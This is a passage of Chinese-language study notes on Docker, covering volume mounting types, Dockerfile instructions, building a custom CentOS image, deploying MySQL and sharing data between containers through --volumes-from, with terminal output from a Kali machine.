<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过 -v 卷名：容器内路径[root@VM-16-15-centos /]<span class="comment"># docker run -d -P --name nginx03 -v juming-nginx:/etc/nginx nginx</span></span></span><br><span class="line">de989ab4da904d4485d09134ef75fbbdc902a17eb1f1ce088161e1331d04e1d1</span><br><span class="line"></span><br><span class="line">[root@VM-16-15-centos /]# docker volume ls</span><br><span class="line">DRIVER    VOLUME NAME</span><br><span class="line">local     6d6823cbffcdc5309333df94acf6646c8e3b49998b17b9da58fd74694ce0b061</span><br><span class="line">local     c393f55a28b9e8cd929cc57479c11a48290d74892ed481bc208cb8e881c1d7be</span><br><span class="line">local     juming-nginx</span><br></pre></td></tr></table></figure>

<p><strong>查看指定卷信息</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-16-15-centos /]# docker volume inspect juming-nginx[&#123;&quot;CreatedAt&quot;: &quot;2022-06-13T22:29:41+08:00&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Labels&quot;: null,</span><br><span class="line">        &quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/juming-nginx/_data&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;juming-nginx&quot;,</span><br><span class="line">        &quot;Options&quot;: null,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;&#125;]</span><br><span class="line">所有的docker容器内的卷，没有指定目录的情况下爱都存在 /var/lib/docker/volumes/xxxx/_data</span><br></pre></td></tr></table></figure>

<p><strong>查看宿主机中的nginx信息</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-16-15-centos /]# cd /var/lib/docker/volumes[root@VM-16-15-centos volumes]# ls</span><br><span class="line">6d6823cbffcdc5309333df94acf6646c8e3b49998b17b9da58fd74694ce0b061  juming-nginx</span><br><span class="line">backingFsBlockDev                                                 metadata.db</span><br><span class="line">c393f55a28b9e8cd929cc57479c11a48290d74892ed481bc208cb8e881c1d7be</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">为了方便找到一个卷，通常使用具名挂载</span></span><br></pre></td></tr></table></figure>

<h3 id="3-如何确定是具名挂载还是匿名挂载，还是指定路径挂载"><a href="#3-如何确定是具名挂载还是匿名挂载，还是指定路径挂载" class="headerlink" title="3.如何确定是具名挂载还是匿名挂载，还是指定路径挂载"></a>3.如何确定是具名挂载还是匿名挂载，还是指定路径挂载</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-v 容器内路径                   #匿名挂载</span><br><span class="line">-v 卷名:容器内路径               #具名挂载</span><br><span class="line">-v /宿主机路径:容器内路径         #指定路径挂载</span><br></pre></td></tr></table></figure>

<h3 id="4-扩展"><a href="#4-扩展" class="headerlink" title="4.扩展"></a>4.扩展</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过 -v 容器内路径 ，ro  rw 改变读写权限</span></span><br><span class="line">ro    readonly   #只读</span><br><span class="line">rw   readwrite   #可读可写# 一旦这个设置了容器权限，容器 对我们挂载出来就有限制了！！docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginx</span><br><span class="line"> docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ro只要看到ro说明这个路径只能通过宿主机来操作，容器内部无法操作</span></span><br></pre></td></tr></table></figure>

<p>docker传递环境变量</p>
<p>Docker run -e</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -ti --name ctfdemo1 -p 86:80 -v /home/kali/Downloads/:/usr/share/nginx/html -e flag=flag&#123;fae0b27c451c728867a567e8c1bb4e53&#125; 605c77e624dd <span class="built_in">printenv</span></span><br><span class="line">HOSTNAME=5a671078b6fd</span><br><span class="line">HOME=/root</span><br><span class="line">PKG_RELEASE=1~bullseye</span><br><span class="line">flag=flag&#123;fae0b27c451c728867a567e8c1bb4e53&#125;</span><br><span class="line">TERM=xterm</span><br><span class="line">NGINX_VERSION=1.21.5</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">NJS_VERSION=0.7.1</span><br><span class="line">PWD=/</span><br></pre></td></tr></table></figure>

<h2 id="docker部署mysql"><a href="#docker部署mysql" class="headerlink" title="docker部署mysql"></a>docker部署mysql</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -tid --name qcsql -p 3309:3306 -e MYSQL_ROOT_PASSWORD=123456  -v /root/mysql:/etc/mysql/conf.d -v /root/mysql/data/:/var/lib/mysql 3218b38490ce  </span><br><span class="line">──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># cd /root                    </span></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># </span></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># ls       </span></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># mkdir mysql </span></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cd mysql   </span></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~/mysql]</span><br><span class="line">└─<span class="comment"># mkdir data </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali]</span><br><span class="line">└─<span class="comment"># docker run -tid --name qcsql -p 3309:3306 -e MYSQL_ROOT_PASSWORD=123456  -v /root/mysql:/etc/mysql/conf.d -v /root/mysql/data/:/var/lib/mysql 3218b38490ce  </span></span><br><span class="line">c189959fb959fb50959a5d699157c6e14ecb497af28198e49457d945edb5621f</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~kali]</span><br><span class="line">└─<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND                  CREATED         STATUS                   PORTS                                                                                  NAMES</span><br><span class="line">c189959fb959   3218b38490ce           <span class="string">&quot;docker-entrypoint.s…&quot;</span>   7 seconds ago   Up 6 seconds             33060/tcp, 0.0.0.0:3309-&gt;3306/tcp, :::3309-&gt;3306/tcp                                   qcsql</span><br><span class="line">35d4d93f3d3b   605c77e624dd           <span class="string">&quot;/docker-entrypoint.…&quot;</span>   2 hours ago     Up 2 hours               0.0.0.0:83-&gt;80/tcp, :::83-&gt;80/tcp                                                      n03</span><br><span class="line">a07232eba667   605c77e624dd           <span class="string">&quot;/docker-entrypoint.…&quot;</span>   5 hours ago     Exited (0) 2 hours ago                                                                                          mynginx01</span><br><span class="line">6efd902e5166   aoiawd-master_aoiawd   <span class="string">&quot;php ./aoiawd.phar -…&quot;</span>   9 months ago    Up 5 hours               0.0.0.0:1337-&gt;1337/tcp, :::1337-&gt;1337/tcp, 0.0.0.0:8023-&gt;8023/tcp, :::8023-&gt;8023/tcp   aoiawd-master-aoiawd-1</span><br><span class="line">44bf3bc1e11f   mongo:latest           <span class="string">&quot;docker-entrypoint.s…&quot;</span>   9 months ago    Up 5 hours               27017/tcp                                                                              aoiawd-master-mongodb-1</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[~kali]</span><br><span class="line">└─<span class="comment"># mysql -u root -p -h localhost -P 3309</span></span><br><span class="line">Enter password: </span><br><span class="line">WARNING: Forcing protocol to  TCP  due to option specification. Please explicitly state intended protocol.</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 8</span><br><span class="line">Server version: 8.0.27 MySQL Community Server - GPL</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.003 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; </span><br></pre></td></tr></table></figure>

<h2 id="Docker-file"><a href="#Docker-file" class="headerlink" title="Docker file"></a>Docker file</h2><p>dockerfile是用来构建镜像的参数脚本</p>
<h3 id="构建步骤"><a href="#构建步骤" class="headerlink" title="构建步骤:"></a>构建步骤:</h3><p>1、编写一个dockerfile 文件</p>
<p>2、docker build 构建成为一个镜像</p>
<p>3、docker run 运行镜像</p>
<p>4、docker push 发布镜像(DockerHub、阿里云镜像仓库!) </p>
<h3 id="基础知识∶"><a href="#基础知识∶" class="headerlink" title="基础知识∶"></a>基础知识∶</h3><p>1、每个保留关键字（指令）都是必须是大写字母</p>
<p>2、执行从上到下顺序执行</p>
<p>3、#表示注释</p>
<p>4、每一个指令都会创建提交一个新的镜像层，并提交!</p>
<h3 id="dockerfile的指令"><a href="#dockerfile的指令" class="headerlink" title="dockerfile的指令"></a>dockerfile的指令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM        <span class="comment">#基础镜镜像，一切从这里开始构建</span></span><br><span class="line">MAINTAINER  <span class="comment">#镜像是谁写的，姓名+邮箱</span></span><br><span class="line">RUN         <span class="comment">#镜像构建的时候需要运行的命令</span></span><br><span class="line">ADD         <span class="comment">#步骤: tomcat镜像,这个tomcat压缩包!添加内容</span></span><br><span class="line">WORKDIR     <span class="comment">#镜像的工作目录</span></span><br><span class="line">VOLUME      <span class="comment">#挂载的目录</span></span><br><span class="line">EXPOSE      <span class="comment">#保留端口配置</span></span><br><span class="line">CMD         <span class="comment">#指定这个容器启动的时候要运行的命令,只有最后一个会生效，可被替代</span></span><br><span class="line">ENTRYPOINT  <span class="comment">#指定这个容器启动的时候要运行的命令,可以追加命令</span></span><br><span class="line">ONBUILD     <span class="comment">#当构建一个被继承DockerFile 这个时候就会运行ONBuILD的指令。触发指令。</span></span><br><span class="line">COPY        <span class="comment">#类似ADD ，将我们文件拷贝到镜像中</span></span><br><span class="line">ENV         <span class="comment">#构建的时候设置环境变量!</span></span><br></pre></td></tr></table></figure>

<h3 id="查看镜像构建历史命令"><a href="#查看镜像构建历史命令" class="headerlink" title="查看镜像构建历史命令"></a>查看镜像构建历史命令</h3><p>docker history 镜像id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─# docker history eeb6ee3f44bd</span><br><span class="line">IMAGE          CREATED         CREATED BY                                      SIZE      COMMENT</span><br><span class="line">eeb6ee3f44bd   22 months ago   /bin/sh -c #(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span><br><span class="line">&lt;missing&gt;      22 months ago   /bin/sh -c #(nop)  LABEL org.label-schema.sc…   0B        </span><br><span class="line">&lt;missing&gt;      22 months ago   /bin/sh -c #(nop) ADD file:b3ebbe8bd304723d4…   204MB    </span><br></pre></td></tr></table></figure>



<p>简单例子</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># mkdir vol                                                                     </span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># cd vol </span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># vim dockerfile1             </span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME [<span class="string">&quot;volume01&quot;</span>,<span class="string">&quot;volume02&quot;</span>]</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;-------end--------&quot;</span></span><br><span class="line">CMD <span class="built_in">echo</span> /bin/bash</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># ls       </span></span><br><span class="line">dockerfile1</span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME [<span class="string">&quot;volume01&quot;</span>,<span class="string">&quot;volume02&quot;</span>]</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;-------end--------&quot;</span></span><br><span class="line">CMD <span class="built_in">echo</span> /bin/bash</span><br><span class="line"> docker build -f /home/kali/vol/dockerfile1 -t qacentos:1.0 .</span><br><span class="line">┌──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># docker build -f /home/kali/vol/dockerfile1 -t qacentos:1.0 . </span></span><br><span class="line">Sending build context to Docker daemon  2.048kB</span><br><span class="line">Step 1/4 : FROM centos</span><br><span class="line"> ---&gt; 5d0da3dc9764</span><br><span class="line">Step 2/4 : VOLUME [<span class="string">&quot;volume01&quot;</span>,<span class="string">&quot;volume02&quot;</span>]</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 142b8ad144bc</span><br><span class="line">Step 3/4 : CMD <span class="built_in">echo</span> <span class="string">&quot;-------end--------&quot;</span></span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 6d13bdc55343</span><br><span class="line">Step 4/4 : CMD <span class="built_in">echo</span> /bin/bash</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 26463029dda4</span><br><span class="line">Successfully built 26463029dda4</span><br><span class="line">Successfully tagged qacentos:1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># docker images                                               </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">qacentos               1.0       26463029dda4   2 minutes ago   231MB</span><br><span class="line">[root@ad7cdf683208 /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  volume01  volume02</span><br><span class="line">[root@ad7cdf683208 /]<span class="comment"># cd volume01</span></span><br><span class="line">[root@ad7cdf683208 volume01]<span class="comment"># </span></span><br><span class="line">[root@ad7cdf683208 volume01]<span class="comment"># touch container.txt</span></span><br><span class="line">[root@ad7cdf683208 volume01]<span class="comment"># exit</span></span><br><span class="line">┌──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># docker inspect ad7cdf683208  </span></span><br><span class="line"><span class="string">&quot;Mounts&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Type&quot;</span>: <span class="string">&quot;volume&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Source&quot;</span>: <span class="string">&quot;/var/lib/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Destination&quot;</span>: <span class="string">&quot;volume01&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Mode&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;RW&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;Propagation&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Type&quot;</span>: <span class="string">&quot;volume&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;f362b4c8667a6dbb3aba2c45a8dcf014788bceab909d1d1b1797e79ed679b223&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Source&quot;</span>: <span class="string">&quot;/var/lib/docker/volumes/f362b4c8667a6dbb3aba2c45a8dcf014788bceab909d1d1b1797e79ed679b223/_data&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Destination&quot;</span>: <span class="string">&quot;volume02&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Mode&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;RW&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">&quot;Propagation&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br></pre></td></tr></table></figure>

<p>可以看到这种在dockerfile挂载两个目录的方式是匿名挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/vol]</span><br><span class="line">└─<span class="comment"># cd /var/lib/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data</span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/var/…/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">container.txt</span><br></pre></td></tr></table></figure>

<h2 id="实例构建自己的centos"><a href="#实例构建自己的centos" class="headerlink" title="实例构建自己的centos"></a>实例构建自己的centos</h2><h3 id="1-编写dockerfile文件"><a href="#1-编写dockerfile文件" class="headerlink" title="1.编写dockerfile文件"></a>1.编写dockerfile文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM centos:7</span><br><span class="line">MAINTAINER qingan&lt;1913116865@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo &quot;-----end-----&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="2-通过dockerfile构建镜像"><a href="#2-通过dockerfile构建镜像" class="headerlink" title="2.通过dockerfile构建镜像"></a>2.通过dockerfile构建镜像</h3><p>注意命令最后的空格点</p>
<p>docker build -f dockerfile文件路径 -t 镜像名:[tag] .</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -f /home/kali/vol/dockerfile1 -t qacent:1.1 .</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构建完最后会显示成功</span><br><span class="line">Successfully built f59ef13552bc</span><br><span class="line">Successfully tagged qacent:1.1</span><br></pre></td></tr></table></figure>

<h3 id="3-测试运行"><a href="#3-测试运行" class="headerlink" title="3.测试运行"></a>3.测试运行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -ti --name qacent01 qacent:1.1 /bin/bash </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@a835b54179b2 local]# pwd</span><br><span class="line">/usr/local</span><br><span class="line">[root@a835b54179b2 local]# ls -l</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 bin</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 etc</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 games</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 include</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 lib</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 lib64</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 libexec</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 sbin</span><br><span class="line">drwxr-xr-x 5 root root 4096 Nov 13  2020 share</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr 11  2018 src</span><br><span class="line">[root@a835b54179b2 local]# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 11  bytes 946 (946.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">[root@a835b54179b2 local]# vim demo.txt</span><br><span class="line">[root@a835b54179b2 local]# vim -help</span><br><span class="line">VIM - Vi IMproved 7.4 (2013 Aug 10, compiled Dec 15 2020 16:44:08)</span><br><span class="line"></span><br><span class="line">usage: vim [arguments] [file ..]       edit specified file(s)</span><br><span class="line">   or: vim [arguments] -               read text from stdin</span><br><span class="line">   or: vim [arguments] -t tag          edit file where tag is defined</span><br><span class="line">   or: vim [arguments] -q [errorfile]  edit file with first error</span><br><span class="line"></span><br><span class="line">Arguments:</span><br><span class="line">   --                   Only file names after this</span><br><span class="line">   -v                   Vi mode (like &quot;vi&quot;)</span><br><span class="line">   -e                   Ex mode (like &quot;ex&quot;)</span><br><span class="line">   -E                   Improved Ex mode</span><br><span class="line">   -s                   Silent (batch) mode (only for &quot;ex&quot;)</span><br><span class="line">   -d                   Diff mode (like &quot;vimdiff&quot;)</span><br><span class="line">   -y                   Easy mode (like &quot;evim&quot;, modeless)</span><br><span class="line">   -R                   Readonly mode (like &quot;view&quot;)</span><br><span class="line">   -Z                   Restricted mode (like &quot;rvim&quot;)</span><br><span class="line">   -m                   Modifications (writing files) not allowed</span><br><span class="line">   -M                   Modifications in text not allowed</span><br><span class="line">   -b                   Binary mode</span><br><span class="line">   -l                   Lisp mode</span><br><span class="line">   -C                   Compatible with Vi: &#x27;compatible&#x27;</span><br><span class="line">   -N                   Not fully Vi compatible: &#x27;nocompatible&#x27;</span><br><span class="line">   -V[N][fname]         Be verbose [level N] [log messages to fname]</span><br><span class="line">   -D                   Debugging mode</span><br><span class="line">   -n                   No swap file, use memory only</span><br><span class="line">   -r                   List swap files and exit</span><br><span class="line">   -r (with file name)  Recover crashed session</span><br><span class="line">   -L                   Same as -r</span><br><span class="line">   -A                   start in Arabic mode</span><br><span class="line">   -H                   Start in Hebrew mode</span><br><span class="line">   -F                   Start in Farsi mode</span><br><span class="line">   -T &lt;terminal&gt;        Set terminal type to &lt;terminal&gt;</span><br><span class="line">   -u &lt;vimrc&gt;           Use &lt;vimrc&gt; instead of any .vimrc</span><br><span class="line">   --noplugin           Don&#x27;t load plugin scripts</span><br><span class="line">   -p[N]                Open N tab pages (default: one for each file)</span><br><span class="line">   -o[N]                Open N windows (default: one for each file)</span><br><span class="line">   -O[N]                Like -o but split vertically</span><br><span class="line">   +                    Start at end of file</span><br><span class="line">   +&lt;lnum&gt;              Start at line &lt;lnum&gt;</span><br><span class="line">   --cmd &lt;command&gt;      Execute &lt;command&gt; before loading any vimrc file</span><br><span class="line">   -c &lt;command&gt;         Execute &lt;command&gt; after loading the first file</span><br><span class="line">   -S &lt;session&gt;         Source file &lt;session&gt; after loading the first file</span><br><span class="line">   -s &lt;scriptin&gt;        Read Normal mode commands from file &lt;scriptin&gt;</span><br><span class="line">   -w &lt;scriptout&gt;       Append all typed commands to file &lt;scriptout&gt;</span><br><span class="line">   -W &lt;scriptout&gt;       Write all typed commands to file &lt;scriptout&gt;</span><br><span class="line">   -x                   Edit encrypted files</span><br><span class="line">   --startuptime &lt;file&gt; Write startup timing messages to &lt;file&gt;</span><br><span class="line">   -i &lt;viminfo&gt;         Use &lt;viminfo&gt; instead of .viminfo</span><br><span class="line">   -h  or  --help       Print Help (this message) and exit</span><br><span class="line">   --version            Print version information and exit</span><br><span class="line">[root@a835b54179b2 local]# </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现我们安装的vim net-tools成功</p>
<h2 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h2><p>在上面基础上来实现容器间的数据共享</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--volumes-from 数据卷容器(容器<span class="built_in">id</span>)</span><br><span class="line">└─<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS                    PORTS                                                                                  NAMES</span><br><span class="line">ad7cdf683208   4e20caa7b7ae           <span class="string">&quot;/bin/bash&quot;</span>              24 seconds ago   Up 23 seconds                                                                                                    qadf</span><br><span class="line">                                        qadf</span><br><span class="line"></span><br><span class="line">└─<span class="comment"># docker images                                               </span></span><br><span class="line">REPOSITORY             TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">qacentos               1.0       4e20caa7b7ae   7 seconds ago   231MB</span><br></pre></td></tr></table></figure>

<p>注意 ad7cdf683208 是容器id  4e20caa7b7ae是镜像id</p>
<p>这里是把容器 qadf(ad7cdf683208 ) 挂载到 qadf02 qadf02 所用的镜像是 qacentos(4e20caa7b7ae)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/var/…/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data]</span><br><span class="line">└─<span class="comment"># docker run -ti --name qadf02 --volumes-from ad7cdf683208  4e20caa7b7ae /bin/bash </span></span><br><span class="line"></span><br><span class="line">[root@2845c8976ee8 /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  volume01  volume02</span><br><span class="line">[root@2845c8976ee8 /]<span class="comment"># cd volume01</span></span><br><span class="line">[root@2845c8976ee8 volume01]<span class="comment"># ls</span></span><br><span class="line">container.txt</span><br></pre></td></tr></table></figure>

<p>下面qadf容器创建了byqadf.txt 我们在qadf02容器看到了qadf创建的byqadf.txt，然后创建了byqadf02.txt回到qadf容器也看到了qadf02容器创建的byqadf02.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/var/lib/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data<span class="comment"># docker exec -it ad7cdf683208 /bin/bash</span></span><br><span class="line">[root@ad7cdf683208 /]<span class="comment"># ls</span></span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  volume01  volume02</span><br><span class="line">[root@ad7cdf683208 /]<span class="comment"># cd volume01</span></span><br><span class="line">[root@ad7cdf683208 volume01]<span class="comment"># ls</span></span><br><span class="line">container.txt</span><br><span class="line">[root@ad7cdf683208 volume01]<span class="comment"># touch byqadf.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/var/…/docker/volumes/ae0c97eb8d23528ffaadbf8615dcfc67c499d485d7f0865cc171fc299e5f8c50/_data]</span><br><span class="line">└─<span class="comment"># docker attach 2845c8976ee8 </span></span><br><span class="line">[root@2845c8976ee8 volume01]<span class="comment"># ls -al  </span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug  3 04:52 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Aug  3 04:42 ..</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:52 byqadf.txt</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:16 container.txt</span><br><span class="line">[root@2845c8976ee8 volume01]<span class="comment"># touch byqadf02.txt</span></span><br><span class="line">[root@2845c8976ee8 volume01]<span class="comment"># ls -al</span></span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 root root 4096 Aug  3 04:54 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Aug  3 04:42 ..</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:52 byqadf.txt</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:54 byqadf02.txt</span><br><span class="line">-rw-r--r-- 1 root root    0 Aug  3 04:16 container.txt</span><br><span class="line">[root@2845c8976ee8 volume01]<span class="comment"># read escape 